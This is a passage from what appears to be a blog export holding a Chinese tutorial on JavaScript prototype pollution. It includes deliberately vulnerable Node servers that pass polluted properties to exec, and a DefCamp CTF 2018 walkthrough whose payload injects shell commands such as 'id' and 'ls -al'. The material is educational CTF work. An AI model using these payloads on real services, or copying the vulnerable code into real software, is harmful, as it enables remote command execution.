选项。</li>\n</ul>\n<p>Reference:</p>\n<p><code>&lt;白帽子讲web安全&gt;</code></p>\n<p><code>https://www.liaoxuefeng.com/wiki/1022910821149312/1023022332902400</code></p>\n<p><code>http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</code></p>\n<p><code>https://www.cnblogs.com/sdcs/p/8484905.html</code></p>\n<p><code>https://blog.csdn.net/qq_38643434/article/details/81430528</code></p>\n<p><code>https://www.cnblogs.com/xiaohuochai/p/6568039.html</code></p>\n<p><code>https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/</code></p>\n<p><code>https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/</code></p>\n<p><code>https://www.freebuf.com/articles/web/70025.html</code></p>\n<p><code>https://www.anquanke.com/post/id/97671</code></p>\n<p><code>https://www.cnblogs.com/52php/p/5677775.html</code></p>\n<p><code>https://www.infosec-wiki.com/?p=455211</code></p>\n<p><code>https://blog.csdn.net/z69183787/article/details/78954325</code></p>\n<p><code>https://www.w3cschool.cn/fetch_api/fetch_api-lx142x8t.html</code></p>\n"},{"title":"JS 原型链污染","date":"2019-09-08T16:00:00.000Z","_content":"\n# 1@ 前言\n\n最近开始着手编程能力的提高，主要学习和复习一些前端的知识。之前看到过 p 神博客中写到的 js 的原型链污染问题，于是自己进行了一定程度的学习和尝试，写下我的总结，供各位同学们参阅。\n\n\n\n# 2@ JS 的原型继承机制\n\n基础知识我在此就不做过多介绍了，还有所疑惑的同学可以[戳这](<https://blog.wonderkun.cc/2019/07/18/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more>),亦或是[戳这](<https://juejin.im/entry/58dfbe0361ff4b006b166388>)。\n\n这里只简单说下我对 js 继承方法的理解。平常我们学到的大部分面向对象的语言都有类机制，也大多都有 class 这个关键字。而 js 大多还是使用最原生的原型链继承的方法，尽管 class 关键字已经被引入。\n\n> 新的关键字`class`从ES6开始正式被引入到JavaScript中。`class`的目的就是让定义类更简单。\n\n\n\n实际上，class 继承机制仍旧是原型继承实现的。\n\n我们现在拿一个其他具有类机制的语言看下，这里使用 python 做例子。\n\n```python\nclass Person():\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n        self.money = 1000\n\nperson = Person('rt95',20)\nprint(person.money) // 1000\nprint(person.name) // rt95\n```\n\n这里的继承机制很明显，person 这个对象的生成类就是 Person() 类，类中的一切方法和属性都被对象继承，亦可以被 extends 的子类继承。\n\n\n\n反观一下 Js 中的继承例子\n\n```javascript\nfunction Person(name, age) {\n        this.name = name;\n        this.age = age;\n}\nPerson.prototype.money = 1000;\nvar person = new Person(\"rt95\", 20);\nconsole.log(person.money);\nconsole.log(person.name);\n```\n\n\n\n\n\n ![1.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/1.png)\n\n\n\n我们一般理解的是对象直接由类构造而来，而且构造函数是在类里面的一个方法。但是 Js 却恰恰相反，它的构造函数在外面，而真正的类被包含在构造函数里面，属于构造函数的一个属性 **prototype**,所以刚开始的时候用 Js 的对象和原型的时候会感觉到特别的蹩脚。\n\n我们可以这样来理解，以上面的例子为主，我们现在有一个对象 person ，它的类就是构造函数中的 Person.prototype, 而这个类的构造函数就是 Person()，其中：\n\n`Person.prototype 和 person.__proto__` 指向的都是普通意义上 person 对象的类。用之前的面向对象思维理解 Js 的继承机制，可能会是个好办法，如果不喜欢这种办法，就按你舒服的方法来理解。\n\n## 2.1 constructor\n\n这里再提一个小点，我们在其他前端开发的代码中经常会看见类似下面的代码：\n\n```\nStudent.prototype.constructor = Student;  \n```\n\n类似场景大部分出现在构造函数中的原型直接使用了其他构造函数的原型生成对象，如下代码：\n\n```javascript\nfunction Person(name) {\n    this.name = name;\n}  \n\nPerson.prototype.copy = function() {  \n    return this.constructor();\n};  \n\n \nfunction Student(name) {  \n    Person.call(this, name);\n}  \n\n\nStudent.prototype = Object.create(Person.prototype);\n```\n\n上述代码在 Student 构造函数里面直接调用了 Person 构造函数的方法，而且构造函数的原型也直接改为了用 Person 构造函数原型创建的一个对象，即当下所有以 Student 这个构造函数构造的对象会继承所有 Person() 构造函数里面的属性和方法，可是，坏就坏在所有上面了，我们来继续看看下面的这个对象生成：\n\n ![2.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/2.png)\n\n\n\n本来变量 rt95 就是 Student 这个构造函数创建的，只不过它内部使用了 Person 构造函数的方法和继承了一些属性，所以于情于理我们需要将这一点更改过来，使新创建对象们都能认识到自己真正的祖宗是谁！！！\n\n我们再来手动的更改一下这个构造函数的对象的属性，使用下面的例子做演示：\n\n```javascript\nfunction Foreign(shame) {\n      this.shame = shame;\n }\n\nForeign.prototype.copy = function() {\n      return this.constructor();\n };\n\n\nfunction China(name, shame) {\n      Foreign.call(this, shame);\n      this.name = name;\n }\n\n\nChina.prototype = Object.create(Foreign.prototype);\nChina.prototype.constructor = China;\n```\n\n\n\n ![3.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/3.png)\n\n\n\n所以不光是人需要，代码也需要认清自己真正的祖先，否则会造成很多的麻烦。\n\n\n\n# 3@ Js 中的原型链污染\n\n这里我们就拿 p 神博客中的例子来一起探讨一下原型链污染的问题\n\n```javascript\nfunction merge(target, source) {\n    for (let key in source) {\n        if (key in source && key in target) {\n            merge(target[key], source[key])\n        } else {\n            target[key] = source[key]\n        }\n    }\n}\n```\n\n\n\n函数描述的就是合并两个对象。\n\n我们先使用原文给出的第一种 payload :\n\n```javascript\nvar o1 = {}\nvar o2 = {a: 1, \"__proto__\": {b: 2}}\nmerge(o1, o2)\n```\n\n\n\n ![4.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/4.png)\n\n\n\n可以看到，这种方式合并对象，js 引擎是把  \\__proto__ 当做了真正的对象的原型指向的属性，所以里面的值会被附在 o1 对象的属性上面，不会污染原型链。\n\n\n\n我们再看第二个 payload :\n\n```javascript\nlet o1 = {}\nlet o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}')\nmerge(o1, o2)\n```\n\n![5.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/5.png)\n\n这里我们看到 b 的值已经成功被写入到了原型链中了，下面我们看看这两种不同处理的数据到底区别在哪。\n\n\n\n## 3.1 真假 \\__proto__\n\n我们都知道，js 中每个对象都有自己的 \\__proto__,也就是它的原型，包括它的原型也具有这个属性。而这条继承链的终点就是 Object.prototype , 这也很容易验证：\n\n ![6.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/6.png)\n\n\n\n那么如果我们能控制继承链终点的这个对象的属性，那么所有之后代码中生成的对象都会继承，也就此形成了原型链污染。那么我们有什么办法可以来向这个终点对象写入属性呢？\n\n\n\n我们首先尝试一下直接覆盖最终对象的 \\_\\_proto\\_\\_：\n\n ![7.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/7.png)\n\n我们看到，虽然已经写进来了，但是并不是写到了终点对象的属性里面，也就是说，生成对象的原型的原型才是我们真正要操作的那个对象。那么现在我们想一下，这种办法生成的 \\_\\_proto\\_\\_ 属性永远都不可能是最终的那个对象的  \\_\\_proto\\_\\_,为什么呢？因为用这种方法构造出来的原型，其实还是调用了一次 Object 这个构造函数，那么最少也只能是二次继承终点对象。我们用这种方法覆盖 \\_\\_proto\\_\\_的方法是不成立的。\n\n\n\n那么有什么办法，我们构造的这个 \\_\\_proto\\_\\_会被认定为最终对象的 \\_\\_proto__ 呢？目前没有直接修改的办法，因为我们不可能通过一次修改来改变系统保留的 \\_\\_proto\\_\\_ 属性，排除 那种直接可以操控的办法：\n\n`xxx.__proto__.xxx = xxx`\n\n\n\n但是我们可以构造一个普通的非系统保留的 \\_\\_proto\\_\\_ 属性，然后通过合并的方式来达到我们的目的。什么方法？上文已经提到了，就是 JSON.parse() 这个方法，因为解析这个 json 格式的字符串是从整体来看的，那么里面的 \\_\\_proto\\_\\_ 属性可以被解析为一个对象的普通属性。\n\n\n\n ![8.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/8.png)\n\n\n\n通过对象颜色也可以看出来， 此时的这个 test对象，已经拥有了一个非系统保留的 \\_\\_proto\\_\\_ 属性，我们可以用下面的方法来检验：\n\n ![9.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/9.png)\n\n\n\n那么我们可以通过键名合并的方式来将这个`假的` \\_\\_proto\\_\\_ 合并到 `真的` \\_\\_proto\\_\\_ 上面。调用上面的 merge() 方法实现。\n\n\n\n## 3.2 其他的几种攻击场景\n\n### 1、 控制了多个参数\n\n想象一下这个场景，用户可以控制对象的 3 个以上的参数，那么我们将直接有机会来改变终点原型的属性：\n\n ![10.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/10.png)\n\n\n\n或者是两个参数：\n\n ![11.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/11.png)\n\n\n\n这是一种通过已实例化的对象来进行回溯原型污染，还可以是下面这种直接操作构造函数的形式：\n\n\n\n![12](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/12.png)\n\n\n\n当我们可操控的对象不是最终 Object 构造函数形成的时候，我们可以使用 testObj.\\_\\_proto\\_\\_.\\_\\_proto\\_\\_ 这种方法来回溯。\n\n下面给出一个测试例子：\n\n```javascript\nvar url = require('url');\nvar http = require('http');\nvar fs = require('fs');\nvar exec = require('child_process').exec;\n\nhttp.createServer(function(req,res){\n        var req_url = req.url;\n        var str_url = url.parse(req_url,true).query;\n        var path1 = String(str_url.pathname1);\n        var path2 = String(str_url.pathname2);\n        var value = String(str_url.value);\n        var obj = {earth:{country:'UK'}};\n        obj[path1][path2] = value;\n        console.log(obj)\n        var test = {};\n        exec(test.vul,function(err,data,stderr){\n        if(err){\n                console.log(stderr);\n        }\n        else{\n                console.log(data);\n        }\n})}).listen(1234);\n\n```\n\n\n\n\n\n客户端：\n\n````html\n<form action='http://127.0.0.1:1234' method=\"get\">\npathname1:<input type=\"text\" name=\"pathname1\"> <br>\npathname2:<input type=\"text\" name=\"pathname2\"> <br>\nvalue   :<input type:\"text\" name=\"value\"> <br>\n<input type='submit' name='submit'>\n</form>\n````\n\n我们访问客户端来构造利用 payload :\n\n```\npathname1 = __proto__\npathname2 = a\nvalue = command\n```\n\n\n\n ![13](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/13.png)\n\n\n\n\n\n### 2、控制了路径赋值参数\n\n有的 api 里面有通过传入路径来给对象属性赋值的方法，如果部分参数可控，便可以达到原型链污染的目的，沿用上面的代码例子，我们引入 pathval 这个第三方 api，通过里面的 setPathVal 方法，来触发原型链污染的漏洞：\n\n```javascript\n// 服务端\nvar url = require('url');\nvar http = require('http');\nvar fs = require('fs');\nvar exec = require('child_process').exec;\nvar pathval = require('pathval');\nhttp.createServer(function(req,res){\n        var req_url = req.url;\n        var str_url = url.parse(req_url,true).query;\n        var path1 = String(str_url.pathname1);\n        var value = String(str_url.value);\n        var obj = {earth:{country:'UK'}};\n        pathval.setPathValue(obj,path1,value)\n        var test = {};\n        exec(test.vul,function(err,data,stderr){\n        if(err){\n                console.log(stderr);\n        }\n        else{\n                console.log(data);\n        }\n})}).listen(1234);\n\n```\n\n\n\n ![14](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/14.png)\n\n\n\n\n\n\n\n### 3、对象克隆\n\n实质上还是递归进行合并的做法，我们可以用前面分析过的方法理解。下面我们提下一般深层克隆的方法：\n\n```javascript\n<script>\n    var obj = {\n        name: \"rt95\",\n        age: 20,\n        monry: 1000\n    };\n    var obj1 = {};\n\n    function clone(origin, target) {\n        target = target || {};\n\n        toStr = Object.prototype.toString;\n        arrstr = \"[object Array]\";\n        for (prop in origin) {\n            if (origin.hasOwnProperty(prop)) {\n                if (typeof(origin[prop]) === \"object\") {\n                    if (toStr.call(prop) === arrstr) {\n                        target[prop] = [];\n                    } else {\n                        target[prop] = {};\n                    }\n                    clone(origin[prop], target[prop])\n                } else {\n                    target[prop] = origin[prop];\n                }\n            }\n        }\n    }\n\n    clone(obj, obj1);\n</script>\n```\n\n\n\n大致流程就是：\n\n```\n1、生成克隆对象 ------>\n2、判断 origin（被克隆对象）的元素是原始值还是引用值 ------>\n3、原始值直接进行赋值，引用值需要分情况 ------>\n4、引用值如果是数组，那么在克隆对象中创建一个空数组，然后递归上面原始值的克隆过程 ----->\n5、引用值如果是对象，那么在克隆对象中创建一个空对象，然后递归上面原始值的克隆过程。\n```\n\n\n\n>原始值：\n>\n>存储在栈（stack）中的简单数据段，也就是说，它们的值直接存储在变量访问的位置。\n>\n>\n>\n>引用值：\n>\n>存储在堆（heap）中的对象，也就是说，存储在变量处的值是一个指针（point），指向存储对象的内存处。\n\n- 原始值就是单变量形成的值，值一般是字面量，像整数，字符串等。\n- 引用值就是对象，数组等结构型的值。\n\n那么克隆引用值的时候赋给克隆对象的值将会是原对象所指的数据处，那么相当于克隆对象和被克隆对象共有这组值。所以为了实现完全独一份的克隆，我们需要深入到引用值内部元素，然后进行克隆对象新建相应引用值类型数据结构后的逐一赋值。\n\n\n\n\n\n\n\n\n\n# 4@ 实战题目\n\n\n\n题目来源于 DefCamp CTF 2018 ，源码可以[在这下载](https://dctf.def.camp/dctf-18-quals-81249812/chat.zip)。\n\n\n\n```javscript\n// 客户端代码\nconst io = require('socket.io-client')\nconst socket = io.connect('https://chat.dctfq18.def.camp') // 此处我们可以设为本地测试的地址\n\nif(process.argv.length != 4) {\n  console.log('name and channel missing')\n   process.exit()\n}\nconsole.log('Logging as ' + process.argv[2] + ' on ' + process.argv[3])\nvar inputUser = {\n  name: process.argv[2],\n};\n\nsocket.on('message', function(msg) {\n  console.log(msg.from,\"[\", msg.channel!==undefined?msg.channel:'Default',\"]\", \"says:\\n\", msg.message);\n});\n\nsocket.on('error', function (err) {\n  console.log('received socket error:')\n  console.log(err)\n})\n\nsocket.emit('register', JSON.stringify(inputUser));\nsocket.emit('message', JSON.stringify({ msg: \"hello\" }));\nsocket.emit('join', process.argv[3]);//ps: you should keep your channels private\nsocket.emit('message', JSON.stringify({ channel: process.argv[3], msg: \"hello channel\" }));\nsocket.emit('message', JSON.stringify({ channel: \"test\", msg: \"i own you\" }));\n\n```\n\n从命令行接受进入参数后，然后将序列化后的数据发送到服务端，触发服务端事件。\n\n在源码包里面我们发现了服务端引用模块文件 helper.js 中有如下执行系统命令的方法：\n\n````\ngetAscii: function(message) {\n        var e = require('child_process');\n        return e.execSync(\"cowsay '\" + message + \"'\").toString();\n    }\n\n````\n\n在服务端代码中定位到使用此方法的位置：在 join 和 leave 事件里面都有使用：\n\n\n\n```javascript\n// 服务端代码\n.......\n\nio.on('connection', function (client) { \n    client.on('register', function(inUser) {\n        try {\n            newUser = helper.clone(JSON.parse(inUser))\n\n.........\n\n    client.on('join', function(channel) {\n        try {\n            clientManager.joinChannel(client, channel);\n            sendMessageToClient(client,\"Server\", \n                \"You joined channel\", channel)\n\n            var u = clientManager.getUsername(client);\n            var c = clientManager.getCountry(client);\n\n            sendMessageToChannel(channel,\"Server\", \n                helper.getAscii(\"User \" + u + \" living in \" + c + \" joined channel\"))\n        } catch(e) { console.log(e); client.disconnect() }\n    });\n\n    client.on('leave', function(channel) {\n        try {\n            client .join(channel);\n            clientManager.leaveChannel(client, channel);\n            sendMessageToClient(client,\"Server\", \n                \"You left channel\", channel)\n\n            var u = clientManager.getUsername(client);\n            var c = clientManager.getCountry(client);\n            sendMessageToChannel(channel, \"Server\", \n                helper.getAscii(\"User \" + u + \" living in \" + c + \" left channel\"))\n        } catch(e) { console.log(e); client.disconnect() }\n    });\nserver.listen(3000, function (err) {\n  if (err) throw err;\n  console.log('listening on port 3000');  // 这里的端口也可以改为本地测试端口\n});\n\n```\n\n\n\n参数 u 和 c 是通过模块 clientManager 中的 getUsername 方法和 getCountry 方法得到，跟进到 clientManager.js 文件中：\n\n```javascript\n  getUsername: function (client) {\n        return this.clients[client.id].u.name;\n    },\n  getCountry: function (client) {\n        return this.clients[client.id].u.country;\n    }\n\n```\n\n直接返回原先服务端注册生成的用户信息，我们来看看那个方法：\n\n```javascript\nclientManager.registerClient(client, newUser); // newUser 就是客户端传来的经过 clone 和 JSON.parse() 处理的数据。\n```\n\n\n\n```javascript\n// clientManager.js\nregisterClient: function (client, user) {\n        this.clients[client.id] = { 'c': client,\n                                    'u': user,\n                                    'ch': {}\n        };\n    }\n```\n\n\n\n所以上面的 getAscii 方法中的 u 就是我们客户端传入的经过处理的数据，只需让这个对象的 country 属性变得可利用即可，那么可以直接赋值吗？很可惜被黑名单过滤了：\n\n```javascript\n// helper.js\n validUser: function(inp) {\n        var block = [\"source\",\"port\",\"font\",\"country\",\n                     \"location\",\"status\",\"lastname\"];\n        if(typeof inp !== 'object') {\n            return false;\n        }\n```\n\n被检测函数的黑名单过滤了，那么就不能直接给 country 属性赋值了，但是我们可以放到其原型里面，所以下面我们就来看看另一个处理传入数据的函数，clone() : \n\n```javascript\n<script>\n    function clone(obj) {\n\n        if (typeof obj !== 'object' || obj === null) {\n\n            return obj;\n        }\n\n        var newObj;\n        var cloneDeep = false;\n\n    ......\n            else {\n                var proto = Object.getPrototypeOf(obj);\n                if (proto && proto.isImmutable) {\n\t\t\t\t\n                    newObj = obj;\n                }\n                else {\n                    newObj = Object.create(proto);\n                    cloneDeep = true;\n                }\n            }\n        } else {\n            newObj = [];\n            cloneDeep = true;\n        }\n\n        if (cloneDeep) {\n            var keys = Object.getOwnPropertyNames(obj);\n\n            \n            for (var i = 0; i < keys.length; ++i) {\n                var key = keys[i];\n                var descriptor = Object.getOwnPropertyDescriptor(obj, key);\n                if (descriptor && (descriptor.get || descriptor.set)) {\n\n                    \n                    Object.defineProperty(newObj, key, descriptor);\n                }\n                else {\n                    newObj[key] = this.clone(obj[key]);\n                }\n            }\n        }\n\n        return newObj;\n    }\n</script>\n```\n\n\n\n由于我们传入的参数直接是对象（JSON.parse() 之后的结果），所以直接定位代码到处理对象的分支：\n\n```javascript\nelse {\n            newObj = Object.create(proto);\n            cloneDeep = true;\n}\n......\nif (cloneDeep) {\n            var keys = Object.getOwnPropertyNames(obj);\n\n\n            for (var i = 0; i < keys.length; ++i) {\n                var key = keys[i];\n                var descriptor = Object.getOwnPropertyDescriptor(obj, key);\n                if (descriptor && (descriptor.get || descriptor.set)) {\n\n\n                    Object.defineProperty(newObj, key, descriptor);\n                } else {\n                    newObj[key] = this.clone(obj[key]);\n                }\n            }\n        }\n\n        return newObj;\n```\n\n\n\n其中这个方法 `getOwnPropertyDescriptor()`,返回指定对象上自有属性的对应描述符，由于我们通过 JSON.parse() 方法传入的对象已经具有 \\_\\_proto\\_\\_ 这个属性了，所以可以用这个方法获取到。\n\n通过 Object.create() 函数创建对象，原型使用我们构造的对象的原型，即具有普通属性的 \\_\\_proto\\_\\_,则可以成功通过这个方法使得 newObj 拥有我们可控的 country 属性，而后面方法 `newObj[key]  = this.clone(obj[key])` 再写入一次还是这个结果。至此，属性 country 被写入到操作对象中，等待被调用数据，我们构造如下 payload ：\n\n```javascript\nconst io = require('socket.io-client')\nconst socket = io.connect('https://chat.dctfq18.def.camp')  // 测试时换为本地地址\n\nsocket.on('error', function (err) {\n  console.log('received socket error:')\n  console.log(err)\n})\n\nsocket.on('message', function(msg) {\n  console.log(msg.from,\"[\", msg.channel!==undefined?msg.channel:'Default',\"]\", \"says:\\n\", msg.message);\n});\n\nsocket.emit('register', `{\"name\":\"xxx\", \"__proto__\":{\"country\":\"xxx';id;echo 'xxx\"}}`);\nsocket.emit('message', JSON.stringify({ msg: \"hello\" }));\nsocket.emit('register', `{\"name\":\"xxx\", \"__proto__\":{\"country\":\"xxx';ls -al;echo 'xxx\"}}`);\n```\n\n访问触发：\n\n![15](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/15.png)\n\n\n\n我们总结一下整个调用链：\n\n```\n1、客户端传入触发服务端 register 事件时的待解析的数据，包含原型的数据 ------>\n2、客户端触发服务端 register 事件，传入数据被 JSON.parse() 方法解析后传入 clone 方法,由于__proto__ 是普通属性，可以将 country 的值赋给返回的对象 ------>\n3、返回一个具有 country 属性的对象，值就是我们传入的值，拼接调用 getAscii 方法，执行命令 ------>\n4、服务端返回执行命令的消息给客户端，攻击达成\n```\n\n\n\n\n\n# 5@ 总结\n\n\n\n利用一定的函数特征可以检测出一部分的 api 是否具有潜在的 prototype_pollution 的风险，这里是一位国外学者分析的[结果](<https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf>)。\n\n其实这种攻击的防御是比较容易的，合并或者给对象属性赋值之前，检查键名是否为 `__proto__` 等敏感词即可。\n\n\n\n\n\n\n\nReference:\n\n`https://segmentfault.com/a/1190000008338987`\n\n`https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html`\n\n`https://juejin.im/entry/58dfbe0361ff4b006b16638`\n\n`https://blog.wonderkun.cc/2019/07/18/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more`\n\n`https://stackoverflow.com/questions/8453887/why-is-it-necessary-to-set-the-prototype-constructor`\n\n`https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf`\n","source":"_posts/深入理解 javascript 原型链污染.md","raw":"---\ntitle: JS 原型链污染\ntags:\n - vulneralbility\n - javascript\n - image: /image/bike.png\ndate: 2019-09-09\n---\n\n# 1@ 前言\n\n最近开始着手编程能力的提高，主要学习和复习一些前端的知识。之前看到过 p 神博客中写到的 js 的原型链污染问题，于是自己进行了一定程度的学习和尝试，写下我的总结，供各位同学们参阅。\n\n\n\n# 2@ JS 的原型继承机制\n\n基础知识我在此就不做过多介绍了，还有所疑惑的同学可以[戳这](<https://blog.wonderkun.cc/2019/07/18/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more>),亦或是[戳这](<https://juejin.im/entry/58dfbe0361ff4b006b166388>)。\n\n这里只简单说下我对 js 继承方法的理解。平常我们学到的大部分面向对象的语言都有类机制，也大多都有 class 这个关键字。而 js 大多还是使用最原生的原型链继承的方法，尽管 class 关键字已经被引入。\n\n> 新的关键字`class`从ES6开始正式被引入到JavaScript中。`class`的目的就是让定义类更简单。\n\n\n\n实际上，class 继承机制仍旧是原型继承实现的。\n\n我们现在拿一个其他具有类机制的语言看下，这里使用 python 做例子。\n\n```python\nclass Person():\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n        self.money = 1000\n\nperson = Person('rt95',20)\nprint(person.money) // 1000\nprint(person.name) // rt95\n```\n\n这里的继承机制很明显，person 这个对象的生成类就是 Person() 类，类中的一切方法和属性都被对象继承，亦可以被 extends 的子类继承。\n\n\n\n反观一下 Js 中的继承例子\n\n```javascript\nfunction Person(name, age) {\n        this.name = name;\n        this.age = age;\n}\nPerson.prototype.money = 1000;\nvar person = new Person(\"rt95\", 20);\nconsole.log(person.money);\nconsole.log(person.name);\n```\n\n\n\n\n\n ![1.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/1.png)\n\n\n\n我们一般理解的是对象直接由类构造而来，而且构造函数是在类里面的一个方法。但是 Js 却恰恰相反，它的构造函数在外面，而真正的类被包含在构造函数里面，属于构造函数的一个属性 **prototype**,所以刚开始的时候用 Js 的对象和原型的时候会感觉到特别的蹩脚。\n\n我们可以这样来理解，以上面的例子为主，我们现在有一个对象 person ，它的类就是构造函数中的 Person.prototype, 而这个类的构造函数就是 Person()，其中：\n\n`Person.prototype 和 person.__proto__` 指向的都是普通意义上 person 对象的类。用之前的面向对象思维理解 Js 的继承机制，可能会是个好办法，如果不喜欢这种办法，就按你舒服的方法来理解。\n\n## 2.1 constructor\n\n这里再提一个小点，我们在其他前端开发的代码中经常会看见类似下面的代码：\n\n```\nStudent.prototype.constructor = Student;  \n```\n\n类似场景大部分出现在构造函数中的原型直接使用了其他构造函数的原型生成对象，如下代码：\n\n```javascript\nfunction Person(name) {\n    this.name = name;\n}  \n\nPerson.prototype.copy = function() {  \n    return this.constructor();\n};  \n\n \nfunction Student(name) {  \n    Person.call(this, name);\n}  \n\n\nStudent.prototype = Object.create(Person.prototype);\n```\n\n上述代码在 Student 构造函数里面直接调用了 Person 构造函数的方法，而且构造函数的原型也直接改为了用 Person 构造函数原型创建的一个对象，即当下所有以 Student 这个构造函数构造的对象会继承所有 Person() 构造函数里面的属性和方法，可是，坏就坏在所有上面了，我们来继续看看下面的这个对象生成：\n\n ![2.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/2.png)\n\n\n\n本来变量 rt95 就是 Student 这个构造函数创建的，只不过它内部使用了 Person 构造函数的方法和继承了一些属性，所以于情于理我们需要将这一点更改过来，使新创建对象们都能认识到自己真正的祖宗是谁！！！\n\n我们再来手动的更改一下这个构造函数的对象的属性，使用下面的例子做演示：\n\n```javascript\nfunction Foreign(shame) {\n      this.shame = shame;\n }\n\nForeign.prototype.copy = function() {\n      return this.constructor();\n };\n\n\nfunction China(name, shame) {\n      Foreign.call(this, shame);\n      this.name = name;\n }\n\n\nChina.prototype = Object.create(Foreign.prototype);\nChina.prototype.constructor = China;\n```\n\n\n\n ![3.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/3.png)\n\n\n\n所以不光是人需要，代码也需要认清自己真正的祖先，否则会造成很多的麻烦。\n\n\n\n# 3@ Js 中的原型链污染\n\n这里我们就拿 p 神博客中的例子来一起探讨一下原型链污染的问题\n\n```javascript\nfunction merge(target, source) {\n    for (let key in source) {\n        if (key in source && key in target) {\n            merge(target[key], source[key])\n        } else {\n            target[key] = source[key]\n        }\n    }\n}\n```\n\n\n\n函数描述的就是合并两个对象。\n\n我们先使用原文给出的第一种 payload :\n\n```javascript\nvar o1 = {}\nvar o2 = {a: 1, \"__proto__\": {b: 2}}\nmerge(o1, o2)\n```\n\n\n\n ![4.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/4.png)\n\n\n\n可以看到，这种方式合并对象，js 引擎是把  \\__proto__ 当做了真正的对象的原型指向的属性，所以里面的值会被附在 o1 对象的属性上面，不会污染原型链。\n\n\n\n我们再看第二个 payload :\n\n```javascript\nlet o1 = {}\nlet o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}')\nmerge(o1, o2)\n```\n\n![5.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/5.png)\n\n这里我们看到 b 的值已经成功被写入到了原型链中了，下面我们看看这两种不同处理的数据到底区别在哪。\n\n\n\n## 3.1 真假 \\__proto__\n\n我们都知道，js 中每个对象都有自己的 \\__proto__,也就是它的原型，包括它的原型也具有这个属性。而这条继承链的终点就是 Object.prototype , 这也很容易验证：\n\n ![6.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/6.png)\n\n\n\n那么如果我们能控制继承链终点的这个对象的属性，那么所有之后代码中生成的对象都会继承，也就此形成了原型链污染。那么我们有什么办法可以来向这个终点对象写入属性呢？\n\n\n\n我们首先尝试一下直接覆盖最终对象的 \\_\\_proto\\_\\_：\n\n ![7.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/7.png)\n\n我们看到，虽然已经写进来了，但是并不是写到了终点对象的属性里面，也就是说，生成对象的原型的原型才是我们真正要操作的那个对象。那么现在我们想一下，这种办法生成的 \\_\\_proto\\_\\_ 属性永远都不可能是最终的那个对象的  \\_\\_proto\\_\\_,为什么呢？因为用这种方法构造出来的原型，其实还是调用了一次 Object 这个构造函数，那么最少也只能是二次继承终点对象。我们用这种方法覆盖 \\_\\_proto\\_\\_的方法是不成立的。\n\n\n\n那么有什么办法，我们构造的这个 \\_\\_proto\\_\\_会被认定为最终对象的 \\_\\_proto__ 呢？目前没有直接修改的办法，因为我们不可能通过一次修改来改变系统保留的 \\_\\_proto\\_\\_ 属性，排除 那种直接可以操控的办法：\n\n`xxx.__proto__.xxx = xxx`\n\n\n\n但是我们可以构造一个普通的非系统保留的 \\_\\_proto\\_\\_ 属性，然后通过合并的方式来达到我们的目的。什么方法？上文已经提到了，就是 JSON.parse() 这个方法，因为解析这个 json 格式的字符串是从整体来看的，那么里面的 \\_\\_proto\\_\\_ 属性可以被解析为一个对象的普通属性。\n\n\n\n ![8.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/8.png)\n\n\n\n通过对象颜色也可以看出来， 此时的这个 test对象，已经拥有了一个非系统保留的 \\_\\_proto\\_\\_ 属性，我们可以用下面的方法来检验：\n\n ![9.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/9.png)\n\n\n\n那么我们可以通过键名合并的方式来将这个`假的` \\_\\_proto\\_\\_ 合并到 `真的` \\_\\_proto\\_\\_ 上面。调用上面的 merge() 方法实现。\n\n\n\n## 3.2 其他的几种攻击场景\n\n### 1、 控制了多个参数\n\n想象一下这个场景，用户可以控制对象的 3 个以上的参数，那么我们将直接有机会来改变终点原型的属性：\n\n ![10.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/10.png)\n\n\n\n或者是两个参数：\n\n 